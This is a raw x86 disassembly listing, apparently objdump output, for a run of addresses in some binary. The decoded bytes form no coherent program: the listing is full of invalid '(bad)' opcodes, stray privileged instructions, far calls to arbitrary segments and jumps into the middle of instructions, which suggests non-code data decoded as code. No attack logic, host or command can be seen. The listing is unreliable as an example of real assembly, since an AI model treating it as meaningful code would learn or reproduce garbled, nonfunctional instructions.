  40da44:	jp     0x40da1d
  40da46:	(bad)  
  40da47:	jnp    0x40da85
  40da49:	adc    ecx,DWORD PTR [esi-0x3d]
  40da4c:	popf   
  40da4d:	retf   
  40da4e:	ins    DWORD PTR es:[edi],dx
  40da4f:	mov    edx,0x250000e1
  40da54:	pop    es
  40da55:	add    BYTE PTR [eax],al
  40da57:	clc    
  40da58:	mov    BYTE PTR [ebp-0x7c5e217f],bl
  40da5e:	(bad)  
  40da5f:	out    dx,al
  40da60:	fsubr  st(2),st
  40da62:	fdivr  QWORD PTR [esi-0x5b]
  40da65:	fwait
  40da66:	call   0xb7b7:0xf1f2b5a9
  40da6d:	ins    DWORD PTR es:[edi],dx
  40da6e:	test   DWORD PTR [esi+0x33],esp
  40da71:	iret   
  40da72:	stc    
  40da73:	xchg   BYTE PTR ds:[eax+eiz*1],ah
  40da77:	mov    edx,DWORD PTR [eax+0x66]
  40da7a:	call   0x75bf:0x1ca72153
  40da81:	shl    BYTE PTR [esi-0x62],0x9c
  40da85:	xor    al,BYTE PTR [edx+edi*1-0x68]
  40da89:	ss adc eax,0xe0b05591
  40da8f:	test   ah,ch
  40da91:	loop   0x40dacf
  40da93:	ret    
  40da94:	test   eax,0xd517bc93
  40da99:	jbe    0x40da95
  40da9b:	stos   BYTE PTR es:[edi],al
  40da9c:	iret   
  40da9d:	es (bad) 
  40da9f:	xchg   ebp,eax
  40daa0:	sti    
  40daa1:	std    
  40daa2:	inc    ebx
  40daa3:	cmc    
  40daa4:	sbb    BYTE PTR [ebp+0x16],bh
  40daa7:	popa   
  40daa8:	enter  0x3459,0x17
  40daac:	ins    BYTE PTR es:[edi],dx
  40daad:	add    BYTE PTR [ebx+0x3182009b],ch
  40dab3:	fmul   QWORD PTR [edx-0x995f8e6]
  40dab9:	jle    0x40da45
  40dabb:	fwait
  40dabc:	retf   0x3202
  40dabf:	mov    edx,0x66e9051f
  40dac4:	lds    edx,FWORD PTR [esp+esi*2-0x48fca445]
  40dacb:	out    0xb6,al
  40dacd:	jge    0x40dabd
  40dacf:	int3   
  40dad0:	push   0xfffffff0
  40dad2:	jle    0x40dab2
  40dad4:	ror    DWORD PTR [edi+0x3e],1
  40dad7:	pop    edx
  40dad8:	in     al,0xe3
  40dada:	mov    ds:0xbc2e0605,eax
  40dadf:	lods   al,BYTE PTR ds:[esi]
  40dae0:	mov    dh,0xe
  40dae2:	jmp    0x52a2bb4d
  40dae7:	or     al,0xd6
  40dae9:	sbb    ebp,esi
  40daeb:	lods   al,BYTE PTR ds:[esi]
  40daec:	add    al,BYTE PTR [ebx-0x5f]
  40daef:	mov    eax,fs
  40daf1:	push   esi
  40daf2:	mov    dh,0x52
  40daf4:	stos   DWORD PTR es:[edi],eax
  40daf5:	(bad)  
  40daf6:	mov    ecx,DWORD PTR [esi-0x36ad2e4c]
  40dafc:	scas   eax,DWORD PTR es:[edi]
  40dafd:	jne    0x40daa5
  40daff:	push   ss
  40db00:	sbb    eax,0xe979cb21
  40db05:	mov    eax,0x89083d6d
  40db0a:	dec    ebp
  40db0b:	push   ebx
  40db0c:	je     0x40db41
  40db0e:	js     0x40dad0
  40db10:	xchg   DWORD PTR [ecx+0x33de615a],eax
  40db16:	inc    eax
  40db17:	shr    DWORD PTR ds:0x961f480f,0xf2
  40db1e:	mov    dh,0x40
  40db20:	rcr    cl,1
  40db22:	jle    0x40db52
  40db24:	adc    DWORD PTR ds:0x12ec0339,esp
  40db2a:	mov    BYTE PTR [edx+0x639ce399],dh
  40db30:	repz jp 0x40daf4
  40db33:	add    BYTE PTR [edx],0x48
  40db36:	stos   DWORD PTR es:[edi],eax
  40db37:	rsm    
  40db39:	inc    edx
  40db3a:	adc    DWORD PTR [esi],ecx
  40db3c:	jns    0x40db5f
  40db3e:	xor    edx,DWORD PTR [ebx-0xf1a4eca]
  40db44:	push   edx
  40db45:	sbb    DWORD PTR [ebx-0x76],edi
  40db48:	xchg   ebx,eax
  40db49:	test   BYTE PTR [ebp+0xbe9eee7],ah
  40db4f:	loop   0x40db19
  40db51:	fmul   DWORD PTR [eax-0x3813db0b]
  40db57:	imul   edi,ecx,0xffffffef
  40db5a:	mov    ebp,esi
  40db5c:	enter  0xed0,0xca
  40db60:	mov    ecx,0x9b1b6fc
  40db65:	loopne 0x40db66
  40db67:	and    ebx,DWORD PTR [ecx+0x46]
  40db6a:	add    eax,0x3f371142
  40db6f:	dec    esp
  40db70:	fyl2x  
  40db72:	jp     0x40db53
  40db74:	(bad)  
  40db75:	call   0x963595b7
  40db7a:	cmp    DWORD PTR [esi+0x2f],eax
  40db7d:	dec    DWORD PTR ds:0x75d2c2b5
  40db83:	test   DWORD PTR [ecx-0x6fc892c],edx
  40db89:	inc    ebx
  40db8a:	dec    esp
  40db8b:	xor    BYTE PTR [edx-0xa],bh
  40db8e:	cmp    esp,DWORD PTR [esi]
  40db90:	fisub  DWORD PTR [esi-0x1fc5fcc6]
  40db96:	ror    bh,cl
  40db98:	dec    ebp
  40db99:	xchg   DWORD PTR [ecx+0x6589ccfb],ebp
  40db9f:	push   edx
  40dba0:	cwde   
  40dba1:	adc    BYTE PTR [esi-0x29eaedd3],cl
  40dba7:	mov    ecx,edi
  40dba9:	or     al,0xe0
  40dbab:	inc    esp
  40dbac:	xchg   ecx,eax
  40dbad:	jb     0x40dc2b
  40dbaf:	fstp   TBYTE PTR [edx]
  40dbb1:	test   BYTE PTR [ebp+0x10],0x48
  40dbb5:	mov    ds:0xda634357,eax
  40dbba:	pop    edi
  40dbbb:	loopne 0x40db49
  40dbbd:	arpl   WORD PTR [ecx+0x36f52ef0],di
  40dbc3:	fldenv [ecx]
  40dbc5:	mov    ?,WORD PTR [edx+0x60bb5f45]
  40dbcb:	mov    dh,0xd0
  40dbcd:	jo     0x40db54
  40dbcf:	push   ds
  40dbd0:	mov    ah,al
  40dbd2:	adc    DWORD PTR [ebx+0x36b757fa],0x8765382
  40dbdc:	iret   
  40dbdd:	pushf  
  40dbde:	into   
  40dbdf:	jbe    0x40db69
  40dbe1:	pop    ss
  40dbe2:	out    dx,eax
  40dbe3:	test   BYTE PTR [esi],ah
  40dbe5:	in     al,0x3d
  40dbe7:	repnz std 
  40dbe9:	xor    eax,0xb2d32b6f
  40dbee:	inc    ecx
  40dbef:	punpckldq mm2,DWORD PTR [ebp-0x5f]
  40dbf3:	jge    0x40dbd6
  40dbf5:	jbe    0x40dbf5
  40dbf7:	cli    
  40dbf8:	test   edx,0xe30ba221
  40dbfe:	cmp    DWORD PTR [edi+0x16fc4bad],esp
  40dc04:	or     dh,BYTE PTR ds:[edi-0x1]
  40dc08:	mov    ecx,ecx
  40dc0a:	sub    BYTE PTR [ebx+0xae74b60],ch
  40dc10:	dec    eax
  40dc11:	std    
  40dc12:	mov    esp,0x57197ae5
  40dc17:	mov    ch,0x32
  40dc19:	fldcw  WORD PTR [ecx-0x51a0b3c3]
  40dc1f:	test   eax,0x32257f2c
  40dc24:	sub    al,0x4
  40dc26:	add    al,0x1d
  40dc28:	jnp    0x40dbf0
  40dc2a:	mov    eax,ds:0xed4bc2a5
  40dc2f:	and    eax,0x7fb2c0e8
  40dc34:	xchg   BYTE PTR [ebx-0x4c20b23d],dh
  40dc3a:	pop    esp
  40dc3b:	out    dx,al
  40dc3c:	adc    ch,BYTE PTR [eax+0x68]
  40dc3f:	inc    edx
  40dc40:	call   DWORD PTR ds:0x46abea34
  40dc46:	rcl    BYTE PTR [ebx],0xa0
  40dc49:	xor    eax,0x9f55dc8
  40dc4e:	fs (bad) 
  40dc50:	scas   eax,DWORD PTR es:[edi]
  40dc51:	xor    al,0x42
  40dc53:	jo     0x40dc26
  40dc55:	out    dx,al
  40dc56:	sub    esi,eax
  40dc58:	call   0xb15:0x3380ef38
  40dc5f:	js     0x40dc7c
  40dc61:	or     bl,bl
  40dc63:	fistp  DWORD PTR [edx+0xbb4451b]
  40dc69:	shr    ecx,0xa3
  40dc6c:	lahf   
  40dc6d:	adc    BYTE PTR [edi+ebp*1-0x6b2e31c7],bl
  40dc74:	enter  0xce8a,0x3b
  40dc78:	sub    dl,BYTE PTR [esi-0x69]
  40dc7b:	lds    esp,FWORD PTR [esi]
  40dc7d:	icebp  
  40dc7e:	repz dec ebx
  40dc80:	sahf   
  40dc81:	iret   
  40dc82:	add    ecx,DWORD PTR [ebx]
  40dc84:	mov    esp,0x6861c507
  40dc89:	shr    edi,1
  40dc8b:	add    al,0x48
  40dc8d:	cwde   
  40dc8e:	xor    al,0x81
  40dc90:	jmp    0x2b4d18d7
  40dc95:	sub    BYTE PTR [ecx-0x37],al
  40dc98:	inc    esi
  40dc99:	jb     0x40dcc1
  40dc9b:	mov    eax,ds:0x2f786487
  40dca0:	retf   0x1e95
  40dca3:	mov    cl,0xe1
  40dca5:	cmc    
  40dca6:	mov    edi,0x13bc0364
  40dcab:	inc    ebx
  40dcac:	pop    es
  40dcad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcae:	adc    al,0xd3
  40dcb0:	ret    0x5927
  40dcb3:	push   ecx
  40dcb4:	pop    ss
  40dcb5:	and    DWORD PTR [ecx-0x388fa848],esi
  40dcbb:	inc    edi
  40dcbc:	or     al,0xa3
  40dcbe:	adc    DWORD PTR [edx+0x32],edi
  40dcc1:	pop    es
  40dcc2:	jno    0x40dc7e
  40dcc4:	xor    dh,BYTE PTR [edx-0x5]
  40dcc7:	cmc    
  40dcc8:	in     al,dx
  40dcc9:	aam    0xf1
  40dccb:	add    dh,cl
  40dccd:	ds jmp 0x1c7d:0xdb1857f
  40dcd5:	jnp    0x40dc72
  40dcd7:	cmp    eax,0x3d40e86a
  40dcdc:	mov    ebp,DWORD PTR [ebx-0x23a133f1]
  40dce2:	fidivr DWORD PTR [edi]
  40dce4:	dec    ebp
  40dce5:	imul   ebx,DWORD PTR [ebx+0x69],0x454efa5c
  40dcec:	push   esp
  40dced:	ss pop esp
  40dcef:	int3   
  40dcf0:	pop    ecx
  40dcf1:	push   cs
  40dcf2:	jb     0x40dced
  40dcf4:	(bad)  
  40dcf5:	out    dx,al
  40dcf6:	pop    ss
  40dcf7:	and    ebp,0xffffffc0
  40dcfa:	jae    0x40dd07
  40dcfc:	jne    0x40dd06
  40dcfe:	out    dx,al
  40dcff:	ret    
  40dd00:	dec    ebx
  40dd01:	xchg   ecx,eax
  40dd02:	jp     0x40dd47
  40dd04:	jmp    0xc4f94730
  40dd09:	and    DWORD PTR [edx-0x24],edx
  40dd0c:	pop    ebp
  40dd0d:	mov    DWORD PTR [ebp+0x33],eax
  40dd10:	cmp    esi,esi
  40dd12:	dec    eax
  40dd13:	push   cs
  40dd14:	adc    bl,BYTE PTR [esi-0x387e8c62]
  40dd1a:	mov    dl,0xc
  40dd1c:	or     DWORD PTR [edi+ebp*2-0x6b533f1],esi
  40dd23:	jmp    0x284196e1
  40dd28:	push   ds
  40dd29:	mov    edi,0xb6375c97
  40dd2e:	mul    BYTE PTR [eax]
  40dd30:	push   edi
  40dd31:	(bad)  
  40dd32:	aas    
  40dd33:	jmp    0xc49c1efa
  40dd38:	pop    eax
  40dd39:	and    eax,0x80904f46
  40dd3e:	cmc    
  40dd3f:	out    0xa5,eax
  40dd41:	mov    edx,0x3731d22b
  40dd46:	dec    eax
  40dd47:	adc    dl,cl
  40dd49:	mov    ch,0x62
  40dd4b:	cdq    
  40dd4c:	(bad)  ds:0xed42c46c
  40dd52:	dec    edx
  40dd53:	and    cl,bh
  40dd55:	scas   eax,DWORD PTR es:[edi]
  40dd56:	sbb    BYTE PTR [eax+0x31845de9],bh
  40dd5c:	cdq    
  40dd5d:	add    al,0x73
  40dd5f:	loop   0x40dd87
  40dd61:	in     eax,dx
  40dd62:	mov    al,ds:0x4bf848f2
  40dd67:	mov    dl,0x6a
  40dd69:	pop    ss
  40dd6a:	mov    dh,0xa
  40dd6c:	adc    al,0xd9
  40dd6e:	jne    0x40dd60
  40dd70:	cld    
  40dd71:	cmp    BYTE PTR [ebx+0x12fa6a52],bh
  40dd77:	push   esi
  40dd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd79:	cwde   
  40dd7a:	(bad)  
  40dd7b:	loopne 0x40dd68
  40dd7d:	test   DWORD PTR [esi-0x6fa8e21a],0x20850673
  40dd87:	jbe    0x40ddb0
  40dd89:	xor    al,0xc0
  40dd8b:	pop    ebx
  40dd8c:	sub    al,0x65
  40dd8e:	mov    ch,0xc1
  40dd90:	fcomp  DWORD PTR [eax+ebx*4-0x41]
  40dd94:	xor    ch,0x94
  40dd97:	aaa    
  40dd98:	cmp    eax,0x508cf4bd
  40dd9d:	jle    0x40dddd
  40dd9f:	pop    ds
  40dda0:	and    eax,0x66adc2d8
  40dda5:	lods   al,BYTE PTR ds:[esi]
  40dda6:	bound  ebx,QWORD PTR [eax+0x221b30c5]
  40ddac:	sbb    DWORD PTR [edi-0x5d],eax
  40ddaf:	inc    esi
  40ddb0:	imul   ebx,DWORD PTR [ecx+0x6fcbb372],0x4
  40ddb7:	or     eax,0x54791522
  40ddbc:	mov    DWORD PTR [esi],eax
  40ddbe:	inc    esp
  40ddbf:	xor    BYTE PTR [esp+esi*8],ch
  40ddc2:	push   ebp
  40ddc3:	cmp    BYTE PTR [edi+0x3f],dh
  40ddc6:	lods   eax,DWORD PTR ds:[esi]
  40ddc7:	jno    0x40de04
  40ddc9:	ret    
  40ddca:	fldcw  WORD PTR [edx-0x68]
  40ddcd:	data16 jnp 0x40ddf4
  40ddd0:	pop    ebx
  40ddd1:	sahf   
  40ddd2:	bound  esp,QWORD PTR [edi+0x1b]
  40ddd5:	push   esp
  40ddd6:	ret    0x7154
  40ddd9:	push   esp
  40ddda:	pop    ecx
  40dddb:	inc    esi
  40dddc:	(bad)  
  40dddd:	pop    es
  40ddde:	dec    edx
  40dddf:	int    0x38
  40dde1:	call   0xcdb7:0x47636a8e
  40dde8:	mov    cl,BYTE PTR [ecx+eiz*8]
  40ddeb:	mov    ebp,esi
  40dded:	pop    es
  40ddee:	shl    bh,cl
  40ddf0:	rcr    BYTE PTR [eax-0x19],cl
  40ddf3:	mov    ebp,0x38e0b6d4
  40ddf8:	add    al,0x18
  40ddfa:	and    BYTE PTR [edi-0x2d4058ae],bl
  40de00:	ss and eax,0x6cdf253b
  40de06:	es das 
  40de08:	pop    ebp
  40de09:	ror    DWORD PTR [edx+edi*1-0x5ec5df90],1
  40de10:	sbb    eax,esi
  40de12:	xor    BYTE PTR [esi+0x3481e060],al
  40de18:	adc    dl,cl
  40de1a:	ret    0x3202
  40de1d:	pusha  
  40de1e:	adc    BYTE PTR [ecx+0x1b],ch
  40de21:	push   edx
  40de22:	sbb    al,0xca
  40de24:	(bad)  
  40de25:	jmp    0x40ddfc
  40de27:	adc    DWORD PTR [ecx-0x10632ff],ebp
  40de2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de2e:	sub    BYTE PTR [esi-0x2ced176c],cl
  40de34:	fild   WORD PTR [edi+0x65]
  40de37:	or     esi,DWORD PTR [edi]
  40de39:	jo     0x40ddc6
  40de3b:	cmp    bl,BYTE PTR [ebx]
  40de3d:	and    edx,DWORD PTR ds:0x792e399d
  40de43:	femms  
  40de45:	xchg   esp,eax
  40de46:	sbb    al,0xa0
  40de48:	scas   al,BYTE PTR es:[edi]
  40de49:	push   ds
  40de4a:	push   ss
  40de4b:	inc    esi
  40de4c:	add    BYTE PTR [ebx],0xe8
  40de4f:	pop    ss
  40de50:	push   ss
  40de51:	mov    eax,ds:0xe597b6f6
  40de56:	and    eax,0x59165056
  40de5b:	add    eax,0xa0cd07be
  40de60:	aam    0x68
  40de62:	jecxz  0x40de01
  40de64:	mov    ds:0x2f7283c0,al
  40de69:	adc    cl,ch
  40de6b:	outs   dx,DWORD PTR ds:[esi]
  40de6c:	pop    edi
  40de6d:	sbb    eax,0xe21e1532
  40de72:	sbb    dh,BYTE PTR [esi-0x1a70d944]
  40de78:	clc    
  40de79:	xor    al,0xab
  40de7b:	aad    0x67
  40de7d:	pop    esi
  40de7e:	sbb    al,0x2a
  40de80:	push   ebx
  40de81:	cld    
  40de82:	scas   eax,DWORD PTR es:[edi]
  40de83:	call   0x33f31a6e
  40de88:	adc    dh,BYTE PTR [esp+0x295d7564]
  40de8f:	inc    eax
  40de90:	mov    dh,0xb7
  40de92:	mov    ecx,0x77b57884
  40de97:	pusha  
  40de98:	lock in al,dx
  40de9a:	pop    ebp
  40de9b:	mov    al,ds:0xd08feb1c
  40dea0:	push   ebp
  40dea1:	and    BYTE PTR [ebp+0x5b],ch
  40dea4:	mov    DWORD PTR [ebx+0x72230e86],edx
  40deaa:	mov    edx,DWORD PTR [ecx+0x73]
  40dead:	lods   eax,DWORD PTR ds:[esi]
  40deae:	inc    edi
  40deaf:	xchg   edi,eax
  40deb0:	scas   eax,DWORD PTR es:[edi]
  40deb1:	fs sbb eax,0x825aaa
  40deb7:	addr16 in al,dx
  40deb9:	push   edx
  40deba:	je     0x40de84
  40debc:	test   DWORD PTR [edx-0x64ae5762],esp
  40dec2:	popa   
  40dec3:	cmp    al,0x37
  40dec5:	rcr    ecx,0xf9
  40dec8:	add    al,0x6f
  40deca:	daa    
  40decb:	pop    eax
  40decc:	cld    
  40decd:	int3   
  40dece:	pop    edi
  40decf:	popa   
  40ded0:	xor    eax,0x3d947818
  40ded5:	jno    0x40df53
  40ded7:	mov    ecx,fs
  40ded9:	aam    0x4e
  40dedb:	mov    DWORD PTR ds:[edi+0x57],esi
  40dedf:	dec    ebp
  40dee0:	jmp    0x6df0dac3
  40dee5:	jmp    0x3da2:0xe94a5497
  40deec:	xchg   edi,eax
  40deed:	mov    DWORD PTR [edi],ebx
  40deef:	stos   DWORD PTR es:[edi],eax
  40def0:	jno    0x40df22
  40def2:	(bad)  
  40def3:	or     eax,eax
  40def5:	mov    al,ds:0xa4c75923
  40defa:	into   
  40defb:	pop    edi
  40defc:	mov    edi,DWORD PTR [edi]
  40defe:	popf   
  40deff:	ss (bad) 
  40df01:	fwait
  40df02:	int3   
  40df03:	int    0x37
  40df05:	mov    edx,0xbe47649e
  40df0a:	cmc    
  40df0b:	mov    dh,0xdd
  40df0d:	pop    eax
  40df0e:	pop    esp
  40df0f:	popf   
  40df10:	cli    
  40df11:	dec    ebx
  40df12:	fs je  0x40debd
  40df15:	es loopne 0x40debb
  40df18:	neg    ebp
  40df1a:	jbe    0x40deea
  40df1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df1d:	dec    ebp
  40df1e:	sbb    al,0x7
  40df20:	jmp    0xdfd76de1
  40df25:	test   DWORD PTR [ebx],ecx
  40df27:	das    
  40df28:	mov    BYTE PTR [ebp+0x7d],al
  40df2b:	sbb    al,0x8f
  40df2d:	mov    BYTE PTR [ecx+0x15],bh
  40df30:	pop    ebx
  40df31:	xchg   edx,eax
  40df32:	lahf   
  40df33:	inc    esp
  40df34:	test   DWORD PTR [ecx+0x121c4521],esi
  40df3a:	out    0x6b,al
  40df3c:	call   FWORD PTR [esi]
  40df3e:	add    ch,BYTE PTR [eax+0x71c93705]
  40df44:	or     bh,BYTE PTR [ecx-0x6b]
  40df47:	mov    dh,0x92
  40df49:	scas   eax,DWORD PTR es:[edi]
  40df4a:	pop    ss
  40df4b:	push   ebp
  40df4c:	popf   
  40df4d:	jge    0x40df65
  40df4f:	add    BYTE PTR [esi+0x42],dl
  40df52:	out    0xe3,eax
  40df54:	pusha  
  40df55:	mov    ds:0x2835c6c5,eax
  40df5a:	sub    dl,0x18
  40df5d:	push   es
  40df5e:	hlt    
  40df5f:	scas   al,BYTE PTR es:[edi]
  40df60:	push   edi
  40df61:	addr16 loop 0x40dfdd
  40df64:	jbe    0x40df70
  40df66:	iret   
  40df67:	xchg   BYTE PTR [edx+ecx*1],al
  40df6a:	xchg   ebx,eax
  40df6b:	mov    edi,0x1a5c446
  40df70:	cmp    al,0xf6
  40df72:	mov    bh,0x37
  40df74:	sub    eax,0xe1835a2c
  40df79:	push   edi
  40df7a:	call   0xa5d2:0xf5bb5ea2
  40df81:	stos   BYTE PTR es:[edi],al
  40df82:	mov    bl,0xc
  40df84:	lods   al,BYTE PTR ds:[esi]
  40df85:	cmc    
  40df86:	mov    ebx,0x5076b642
  40df8b:	arpl   WORD PTR [ebx],bp
  40df8d:	pop    eax
  40df8e:	test   al,0xb
  40df90:	pushf  
  40df91:	or     DWORD PTR [esp+esi*4-0x1f567e33],0xfffffff3
  40df99:	and    BYTE PTR [edi+0x399d844f],dh
  40df9f:	fdivr  QWORD PTR [ebx+ecx*2]
  40dfa2:	xor    al,0x8a
  40dfa4:	pop    eax
  40dfa5:	arpl   WORD PTR [ebx-0x439b9a04],si
  40dfab:	mov    ?,WORD PTR [esi]
  40dfad:	xchg   esi,eax
  40dfae:	cmp    dh,BYTE PTR [edi]
  40dfb0:	inc    ecx
  40dfb1:	xchg   ecx,eax
  40dfb2:	adc    DWORD PTR [ebx],esi
  40dfb4:	(bad)
  40dfb7:	scas   al,BYTE PTR es:[edi]
  40dfb8:	mov    dl,0x45
  40dfba:	adc    eax,0x1a0c6925
  40dfbf:	(bad)
  40dfc2:	retf   0x83f
  40dfc5:	mov    esp,0x94c87009
  40dfca:	pop    ecx
  40dfcb:	imul   edi,DWORD PTR [ebx-0x1a],0x7e2f24e1
  40dfd2:	imul   edi,DWORD PTR ds:0xd7aa1796,0x31
  40dfd9:	pop    ecx
  40dfda:	adc    bh,BYTE PTR [esi]
  40dfdc:	out    0x5d,al
  40dfde:	pop    edi
  40dfdf:	pop    ebx
  40dfe0:	mov    bh,0x40
  40dfe2:	xlat   BYTE PTR ds:[ebx]
  40dfe3:	adc    al,0x61
  40dfe6:	repnz sbb al,0x25
  40dfe9:	sub    BYTE PTR [ebx+0x3e],dh
  40dfec:	cmp    eax,0xa13fc43b
  40dff1:	pop    edx
  40dff2:	icebp  
  40dff3:	jns    0x40e015
  40dff5:	sar    DWORD PTR [edx-0x1e],1
  40dff8:	nop
  40dff9:	sub    ebx,DWORD PTR [eax+ebp*8]
  40dffc:	(bad)  
  40dffd:	icebp  
  40dffe:	pop    esp
  40dfff:	add    ecx,0xfffffff8
  40e002:	rcr    DWORD PTR [ecx],0x2c
  40e005:	cmp    eax,0x67dc03c9
  40e00a:	bound  esi,QWORD PTR [esi+0x61f29bc9]
  40e010:	sub    BYTE PTR [ecx-0x61221e50],ch
  40e016:	jge    0x40e037
  40e018:	hlt    
  40e019:	mov    al,0xab
  40e01b:	adc    edi,esp
  40e01d:	icebp  
  40e01e:	sub    al,BYTE PTR [eax+0x15]
  40e021:	and    DWORD PTR [edx+0x15],esi
  40e024:	imul   esp,DWORD PTR [ecx+ebx*1+0x1b],0xffffffd7
  40e029:	or     DWORD PTR [edi],0xffffff9d
  40e02c:	cmp    ch,BYTE PTR [ebx-0x6220ca37]
  40e032:	adc    edi,DWORD PTR ds:0x3f8f9b4c
  40e038:	push   es
  40e039:	inc    esi
  40e03a:	pop    eax
  40e03b:	push   ecx
  40e03c:	or     al,0xaf
  40e03e:	xchg   ah,cl
  40e040:	fstp   TBYTE PTR es:[esi+0x7f]
  40e044:	scas   al,BYTE PTR es:[edi]
  40e045:	mov    ebp,DWORD PTR [edx-0x5d]
  40e048:	(bad)  
  40e049:	fs inc eax
  40e04b:	in     al,0xce
  40e04d:	push   edx
  40e04e:	pop    es
  40e04f:	mov    ebp,0x57c2ee40
  40e054:	pop    eax
  40e055:	test   cl,bh
  40e057:	fst    st(7)
  40e059:	add    al,0x97
  40e05b:	sbb    al,0x37
  40e05d:	sbb    esp,ecx
  40e05f:	or     esp,eax
  40e061:	and    eax,0xcd76d29e
  40e066:	jo     0x40e0aa
  40e068:	pusha  
  40e069:	xor    ecx,edx
  40e06b:	add    ecx,DWORD PTR [ebx+esi*2+0x2a687521]
  40e072:	cmp    eax,0x38dcee84
  40e077:	lea    edi,cs:[eax-0x73]
  40e07b:	and    BYTE PTR [edi+ecx*4],dl
  40e07e:	inc    edi
  40e07f:	iret   
  40e080:	pop    edi
  40e081:	stos   DWORD PTR es:[edi],eax
  40e082:	icebp  
  40e083:	mov    edx,0xd109eb75
  40e088:	inc    ecx
  40e089:	fwait
  40e08a:	ds test edx,edi
  40e08d:	mov    DWORD PTR [edx-0x26],edx
  40e090:	mov    cl,0x53
  40e092:	fcom   QWORD PTR [edi]
  40e094:	lock mov BYTE PTR [eax],dl
  40e097:	mov    edx,0xd7f07e6a
  40e09c:	or     BYTE PTR [ecx],al
  40e09e:	xchg   ecx,eax
  40e09f:	loop   0x40e093
  40e0a1:	cmp    eax,0x5f5c7934
  40e0a6:	and    eax,0x521c0b88
  40e0ab:	sti    
  40e0ac:	loope  0x40e06b
  40e0ae:	cs push eax
  40e0b0:	retf   
  40e0b1:	mov    esp,0x7fb66d30
  40e0b6:	fcmove st,st(2)
  40e0b8:	lock test al,0x1
  40e0bb:	pop    eax
  40e0bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0bd:	xchg   DWORD PTR [ecx+0x76],ecx
  40e0c0:	adc    DWORD PTR [ebp+eiz*8+0x42],0x2
  40e0c5:	sbb    DWORD PTR [eax+0x58d95fb9],0x6bd42815
  40e0cf:	stos   DWORD PTR es:[edi],eax
  40e0d0:	je     0x40e05e
  40e0d2:	fucom  st(3)
  40e0d4:	out    dx,al
  40e0d5:	dec    esp
  40e0d6:	sahf   
  40e0d7:	and    eax,0x63ef1379
  40e0dc:	sbb    BYTE PTR [ecx-0x7276bef4],0x96
  40e0e3:	sbb    eax,0x7034cbca
  40e0e8:	ror    DWORD PTR [ecx-0x471bf084],0xa5
  40e0ef:	jecxz  0x40e0f1
  40e0f1:	cli    
  40e0f2:	push   0xe
  40e0f4:	int    0x62
  40e0f6:	mov    ?,WORD PTR [ebx+0x66]
  40e0f9:	arpl   WORD PTR [esi],sp
  40e0fb:	int    0x4b
  40e0fd:	inc    edx
  40e0fe:	retfw  
  40e100:	popa   
  40e101:	sbb    al,ah
  40e103:	out    0xd1,eax
  40e105:	cmp    ecx,DWORD PTR [esi+0x5f]
  40e108:	outs   dx,DWORD PTR ds:[esi]
  40e109:	jg     0x40e0f3
  40e10b:	inc    edx
  40e10c:	scas   eax,DWORD PTR es:[edi]
  40e10d:	sbb    eax,0xb751b5fe
  40e112:	xor    eax,0x952de28
  40e117:	cmc    
  40e118:	dec    esi
  40e119:	ja     0x40e0c7
  40e11b:	lea    eax,[edi+0x24]
  40e11e:	sbb    ebp,DWORD PTR [ebp+0x9]
  40e121:	call   0xf29791a9
  40e126:	xchg   BYTE PTR [esi-0x1325e244],ch
  40e12c:	ins    BYTE PTR es:[edi],dx
  40e12d:	retf   
  40e12e:	sti    
  40e12f:	repnz cmp BYTE PTR [eax+esi*4-0x54],dh
  40e134:	test   DWORD PTR [edi+0x53d03e5c],0x913874e5
  40e13e:	shl    eax,1
  40e140:	enter  0xd63b,0xab
  40e144:	inc    edx
  40e145:	mov    ch,0xa0
  40e147:	in     al,0x89
  40e149:	bound  ebp,QWORD PTR [ebp+0x19]
  40e14c:	hlt    
  40e14d:	aas    
  40e14e:	(bad)  
  40e150:	les    ecx,FWORD PTR [esi-0x51]
  40e153:	(bad)  
  40e154:	jle    0x40e1a1
  40e156:	(bad)  
  40e157:	lods   al,BYTE PTR ds:[esi]
  40e158:	icebp  
  40e159:	(bad)  
  40e15a:	fsubr  QWORD PTR [edx-0x4b1208c7]
  40e160:	int    0xb5
  40e162:	repnz xchg ebx,eax
  40e164:	imul   ebp,edi,0x6f
  40e167:	adc    al,0xf8
  40e169:	xor    eax,0x17ad4cd2
  40e16e:	shl    BYTE PTR ds:0xb1c151f,0xd0
  40e175:	lods   eax,DWORD PTR ds:[esi]
  40e176:	mov    edx,0xfd2c900b
  40e17b:	call   0x0:0x0
	...
  40e1be:	add    BYTE PTR [edx-0x406b4a4f],bl
  40e1c4:	xchg   esp,eax
  40e1c5:	mov    ebx,0x5d8b00bf
  40e1ca:	sbb    esi,ebp
  40e1cc:	ds (bad) 
  40e1ce:	adc    ebx,edi
  40e1d0:	call   0x765e1d5
  40e1d5:	add    BYTE PTR [eax],al
  40e1d7:	push   edx
  40e1d8:	bound  esp,QWORD PTR [edi]
  40e1da:	jmp    0xfbfd:0xfd29ca3
  40e1e1:	inc    ebp
  40e1e2:	inc    edx
  40e1e3:	xor    DWORD PTR [edi+0x3549b20b],ebp
  40e1e9:	scas   al,BYTE PTR es:[edi]
  40e1ea:	sbb    al,0xcc
  40e1ec:	gs sbb al,al
  40e1ef:	jo     0x40e1e3
  40e1f1:	das    
  40e1f2:	and    al,0xfd
  40e1f4:	call   0x9da0:0xd8d4f327
  40e1fb:	xchg   ebp,eax
  40e1fc:	dec    esi
  40e1fd:	dec    esp
  40e1fe:	popa   
  40e1ff:	leave  
  40e200:	gs out 0x83,eax
  40e203:	mov    cl,0x33
  40e205:	test   al,0x42
  40e207:	or     cl,dl
  40e209:	jns    0x40e25a
  40e20b:	int    0x92
  40e20d:	outs   dx,DWORD PTR ds:[esi]
  40e20e:	sahf   
  40e20f:	shr    BYTE PTR [ebx-0x79dab308],cl
  40e215:	adc    BYTE PTR [esi+0x6f47d4ca],dh
  40e21b:	shr    ebx,1
  40e21d:	js     0x40e28d
  40e21f:	cmc    
  40e220:	icebp  
  40e221:	ins    DWORD PTR es:[edi],dx
  40e222:	adc    dh,bh
  40e224:	mov    cl,0xe2
  40e226:	loope  0x40e1ed
  40e228:	push   cs
  40e229:	sub    bh,BYTE PTR [esi+0x6b]
  40e22c:	(bad)  
  40e22d:	stc    
  40e22e:	popa   
  40e22f:	cmp    BYTE PTR [edx+0x69a3472e],bh
  40e235:	xchg   ebp,eax
